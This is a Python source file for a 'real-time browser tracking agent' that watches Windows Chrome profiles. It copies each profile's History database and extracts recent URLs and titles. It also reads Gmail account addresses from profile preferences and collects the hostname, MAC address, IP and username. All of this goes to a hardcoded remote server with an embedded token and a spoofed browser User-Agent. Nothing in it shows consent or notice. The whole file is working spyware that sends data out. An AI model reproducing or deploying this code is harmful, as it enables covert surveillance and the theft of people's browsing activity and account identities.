"""
Real-time Browser Tracking Agent
Monitors Chrome history changes and sends data immediately
"""

import os
import sys
import json
import time
import threading
import requests
import sqlite3
import shutil
import tempfile
from datetime import datetime, timezone, timedelta
import socket
import getpass
import platform
from uuid import getnode
import hashlib
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class ChromeHistoryWatcher(FileSystemEventHandler):
    """File system watcher for Chrome history changes"""
    
    def __init__(self, agent_callback):
        self.agent_callback = agent_callback
        self.last_check = time.time()
        self.cooldown = 5  # 5 seconds cooldown to avoid spam
        
    def on_modified(self, event):
        """Handle file modification events"""
        if event.is_directory:
            return
            
        # Check if it's a Chrome History file
        if event.src_path.endswith('History'):
            current_time = time.time()
            
            # Cooldown to avoid multiple triggers
            if current_time - self.last_check > self.cooldown:
                self.last_check = current_time
                print(f"🔔 Chrome history changed: {event.src_path}")
                
                # Trigger data collection with delay (Chrome needs time to write)
                threading.Timer(2.0, self.agent_callback).start()

class RealtimeBrowserAgent:
    """Real-time browser tracking agent"""
    
    def __init__(self, gui_callback=None):
        self.gui_callback = gui_callback
        self.running = False
        self.client_id = None
        self.observer = None
        
        # User data directory for storage
        self.user_data_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "BrowserTracker")
        os.makedirs(self.user_data_dir, exist_ok=True)
        
        # Configuration
        self.config = {
            "server_url": "https://browser-tracking.vercel.app",
            "api_token": "BrowserTracker2024SecureToken",
            "batch_size": 10,  # Smaller batches for real-time
            "fallback_interval": 300  # 5 minutes fallback check
        }
        
        # Data tracking
        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data_realtime.json')
        self.sent_data_hashes = self.load_sent_data()
        
        # Chrome paths to monitor
        self.chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
        
        self.log("🚀 Real-time Browser Agent initialized")
        self.log(f"📁 Data directory: {self.user_data_dir}")
        self.log(f"🌐 Server: {self.config['server_url']}")
        self.log(f"👀 Monitoring: {self.chrome_base}")
    
    def log(self, message):
        """Log message to GUI if available"""
        try:
            if self.gui_callback:
                self.gui_callback(message)
            else:
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"[{timestamp}] {message}")
        except:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")
    
    def load_sent_data(self):
        """Load previously sent data hashes"""
        try:
            if os.path.exists(self.sent_data_file):
                with open(self.sent_data_file, 'r') as f:
                    data = json.load(f)
                    return set(data.get('hashes', []))
            return set()
        except Exception as e:
            self.log(f"❌ Error loading sent data: {e}")
            return set()
    
    def save_sent_data(self):
        """Save sent data hashes"""
        try:
            hashes_list = list(self.sent_data_hashes)[-1000:]  # Keep last 1000
            self.sent_data_hashes = set(hashes_list)
            
            data = {
                'hashes': hashes_list,
                'last_updated': datetime.now().isoformat()
            }
            with open(self.sent_data_file, 'w') as f:
                json.dump(data, f, indent=2)
            self.log(f"💾 Saved {len(hashes_list)} data hashes")
        except Exception as e:
            self.log(f"❌ Error saving sent data: {e}")
    
    def create_data_hash(self, entry):
        """Create unique hash for data entry"""
        hash_string = f"{entry['url']}|{entry['title']}|{entry['profile_name']}"
        return hashlib.md5(hash_string.encode()).hexdigest()
    
    def get_system_info(self):
        """Collect system information"""
        try:
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
        except Exception as e:
            self.log(f"❌ Error getting system info: {e}")
            return None
    
    def send_data(self, endpoint, data):
        """Send data to server"""
        try:
            headers = {
                'Authorization': f'Bearer {self.config["api_token"]}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            url = f'{self.config["server_url"]}/api/{endpoint}'
            
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=30
            )
            
            return response.status_code == 200, response
            
        except Exception as e:
            self.log(f"❌ Error sending data to {endpoint}: {e}")
            return False, None
    
    def register_client(self):
        """Register client with server"""
        try:
            self.log("🔗 Registering client...")
            system_info = self.get_system_info()
            if not system_info:
                return False
            
            success, response = self.send_data('register', system_info)
            if success and response:
                data = response.json()
                if data.get('success'):
                    self.client_id = data.get('client_id')
                    self.log(f"✅ Client registered with ID: {self.client_id}")
                    return True
            
            self.log("❌ Failed to register client")
            return False
            
        except Exception as e:
            self.log(f"❌ Error registering client: {e}")
            return False
    
    def get_recent_chrome_history(self, minutes=5):
        """Get Chrome history from last few minutes only"""
        try:
            if not os.path.exists(self.chrome_base):
                self.log("⚠️ Chrome not found")
                return []
            
            all_history = []
            profiles_found = 0
            
            # Get cutoff time (last N minutes)
            cutoff_time = datetime.now(tz=timezone.utc) - timedelta(minutes=minutes)
            cutoff_chrome_time = int((cutoff_time.timestamp() + 11644473600) * 1000000)
            
            # Check Default profile and numbered profiles
            profiles_to_check = ['Default']
            try:
                for item in os.listdir(self.chrome_base):
                    if item.startswith('Profile '):
                        profiles_to_check.append(item)
            except:
                pass
            
            for profile_name in profiles_to_check:
                profile_path = os.path.join(self.chrome_base, profile_name)
                history_db = os.path.join(profile_path, 'History')
                
                if not os.path.exists(history_db):
                    continue
                
                try:
                    profiles_found += 1
                    
                    # Copy database to avoid locking issues
                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                        temp_db = temp_file.name
                    
                    shutil.copy2(history_db, temp_db)
                    
                    # Read recent history only
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                        SELECT url, title, visit_count, last_visit_time
                        FROM urls
                        WHERE last_visit_time > ?
                        ORDER BY last_visit_time DESC
                        LIMIT 20
                    ''', (cutoff_chrome_time,))
                    
                    profile_entries = 0
                    for row in cursor.fetchall():
                        url, title, visit_count, chrome_time = row
                        
                        # Skip internal URLs
                        if self.should_skip_url(url):
                            continue
                        
                        # Convert Chrome timestamp
                        if chrome_time > 0:
                            unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                            visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                        else:
                            visit_time = datetime.now(tz=timezone.utc)
                        
                        # Get Gmail account for this profile
                        gmail_account = self.get_gmail_account(profile_path)
                        
                        entry = {
                            'url': url[:2000],
                            'title': (title or '')[:500],
                            'visit_time': visit_time.isoformat(),
                            'browser_type': 'Chrome',
                            'profile_name': profile_name,
                            'gmail_account': gmail_account
                        }
                        
                        # Check if this entry was already sent
                        entry_hash = self.create_data_hash(entry)
                        if entry_hash not in self.sent_data_hashes:
                            all_history.append(entry)
                            profile_entries += 1
                    
                    conn.close()
                    os.unlink(temp_db)
                    
                    if profile_entries > 0:
                        self.log(f"📁 {profile_name}: {profile_entries} fresh entries")
                    
                except Exception as e:
                    self.log(f"❌ Error reading {profile_name}: {e}")
                    continue
            
            if len(all_history) > 0:
                self.log(f"⚡ Real-time: {len(all_history)} new entries from {profiles_found} profiles")
                
                # Sort by timestamp (newest first)
                all_history.sort(key=lambda x: x['visit_time'], reverse=True)
                
                return all_history
            else:
                return []
            
        except Exception as e:
            self.log(f"❌ Error getting recent Chrome history: {e}")
            return []
    
    def get_gmail_account(self, profile_path):
        """Extract Gmail account from Chrome profile"""
        try:
            prefs_file = os.path.join(profile_path, 'Preferences')
            if not os.path.exists(prefs_file):
                return None
            
            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)
            
            # Check account_info
            account_info = prefs.get('account_info', [])
            for account in account_info:
                email = account.get('email', '')
                if '@gmail.com' in email.lower():
                    return email
            
            # Check signin info
            signin = prefs.get('signin', {})
            allowed_usernames = signin.get('allowed_usernames', [])
            for username in allowed_usernames:
                if '@gmail.com' in username.lower():
                    return username
            
            return None
        except:
            return None
    
    def should_skip_url(self, url):
        """Check if URL should be skipped"""
        skip_patterns = [
            'chrome://', 'chrome-extension://', 'edge://', 'about:',
            'file://', 'localhost', '127.0.0.1', '192.168.', '10.0.', '172.16.'
        ]
        
        url_lower = url.lower()
        return any(pattern in url_lower for pattern in skip_patterns)

    def collect_and_send_realtime(self):
        """Real-time data collection and transmission"""
        try:
            self.log(f"⚡ Real-time collection triggered ({datetime.now().strftime('%H:%M:%S')})")

            # Ensure client is registered
            if not self.client_id:
                if not self.register_client():
                    return False

            # Collect recent browsing history only
            history = self.get_recent_chrome_history(minutes=5)
            if not history:
                self.log("ℹ️ No new real-time data")
                return True

            # Send browsing data immediately
            self.log(f"📤 Sending {len(history)} real-time entries...")
            success, response = self.send_data('browsing-data', {
                'client_id': self.client_id,
                'browsing_data': history
            })

            if success:
                # Mark data as sent
                for entry in history:
                    entry_hash = self.create_data_hash(entry)
                    self.sent_data_hashes.add(entry_hash)

                # Save sent data hashes
                self.save_sent_data()

                self.log(f"✅ {len(history)} real-time entries sent successfully")
                return True
            else:
                self.log(f"❌ Failed to send real-time data")
                return False

        except Exception as e:
            self.log(f"❌ Error in real-time collection: {e}")
            return False

    def start_file_monitoring(self):
        """Start file system monitoring for Chrome history changes"""
        try:
            if not os.path.exists(self.chrome_base):
                self.log("❌ Chrome directory not found for monitoring")
                return False

            self.log("👀 Starting file system monitoring...")

            # Create event handler
            event_handler = ChromeHistoryWatcher(self.collect_and_send_realtime)

            # Create observer
            self.observer = Observer()
            self.observer.schedule(event_handler, self.chrome_base, recursive=True)
            self.observer.start()

            self.log("✅ File monitoring started - Real-time mode active")
            return True

        except Exception as e:
            self.log(f"❌ Error starting file monitoring: {e}")
            return False

    def stop_file_monitoring(self):
        """Stop file system monitoring"""
        try:
            if self.observer:
                self.observer.stop()
                self.observer.join()
                self.log("🛑 File monitoring stopped")
                return True
            return False
        except Exception as e:
            self.log(f"❌ Error stopping file monitoring: {e}")
            return False

    def start_monitoring(self):
        """Start real-time monitoring"""
        if self.running:
            self.log("⚠️ Monitoring already running")
            return False

        self.log("🚀 Starting real-time monitoring...")
        self.running = True

        # Start file system monitoring
        if not self.start_file_monitoring():
            self.log("❌ Failed to start file monitoring")
            return False

        # Start fallback thread for periodic checks
        self.fallback_thread = threading.Thread(target=self.fallback_monitoring_loop, daemon=True)
        self.fallback_thread.start()

        return True

    def stop_monitoring(self):
        """Stop real-time monitoring"""
        if not self.running:
            self.log("ℹ️ Monitoring not running")
            return False

        self.log("🛑 Stopping real-time monitoring...")
        self.running = False

        # Stop file monitoring
        self.stop_file_monitoring()

        return True

    def fallback_monitoring_loop(self):
        """Fallback monitoring loop (periodic check)"""
        self.log("🔄 Fallback monitoring started (5-minute intervals)")

        while self.running:
            try:
                # Wait for fallback interval
                interval = self.config.get('fallback_interval', 300)  # 5 minutes

                for _ in range(interval):
                    if not self.running:
                        break
                    time.sleep(1)

                if self.running:
                    self.log("🔄 Fallback collection check...")
                    self.collect_and_send_realtime()

            except Exception as e:
                self.log(f"❌ Error in fallback monitoring: {e}")
                time.sleep(60)

        self.log("🛑 Fallback monitoring stopped")

    def test_connection(self):
        """Test connection to server"""
        try:
            self.log("🔗 Testing server connection...")
            response = requests.get(f"{self.config['server_url']}/health", timeout=10)

            if response.status_code == 200:
                data = response.json()
                self.log(f"✅ Server online: {data.get('status', 'unknown')}")
                return True
            else:
                self.log(f"❌ Server returned status {response.status_code}")
                return False

        except Exception as e:
            self.log(f"❌ Connection failed: {e}")
            return False

def main():
    """Main function for real-time mode"""
    print("⚡ Starting Browser Tracker in REAL-TIME Mode...")
    print("🔔 Monitors Chrome history changes instantly")
    print("📡 Sends data immediately when browsing occurs")
    print("🛑 To stop: Ctrl+C")
    print("="*50)

    # Import timedelta here
    from datetime import timedelta

    agent = RealtimeBrowserAgent()

    try:
        if agent.test_connection():
            agent.start_monitoring()

            # Keep running
            while agent.running:
                time.sleep(1)
        else:
            print("❌ Cannot connect to server")

    except KeyboardInterrupt:
        print("\n🛑 Stopping real-time agent...")
        agent.stop_monitoring()

if __name__ == "__main__":
    main()
